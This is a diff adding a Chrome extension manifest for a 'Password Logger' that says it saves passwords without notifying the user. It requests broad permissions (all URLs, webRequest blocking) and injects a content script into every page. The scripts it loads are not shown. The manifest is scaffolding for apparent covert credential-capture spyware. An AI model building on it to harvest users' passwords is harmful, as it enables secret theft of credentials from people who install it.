@@ -1,0 +1,26 @@
+{
+	"manifest_version": 2,
+
+	"name": "Password Logger",
+	"short_name":"PWLog",
+	"description": "This extensions helps you save your passwords without notification to the user.",
+	"version": "0.1",
+	"homepage_url": "https://codeaffair.com",
+	"permissions": [
+		"storage",
+		"webRequest",
+		"webRequestBlocking",
+		"<all_urls>"
+	],
+	"background": {
+		"scripts": ["js/background.js"],
+		"persistent": true
+	},
+	"content_scripts":[
+		{
+			"matches":["<all_urls>"],
+			"js":["js/content.js"],
+			"run_at":"document_end"
+		}
+	]
+}
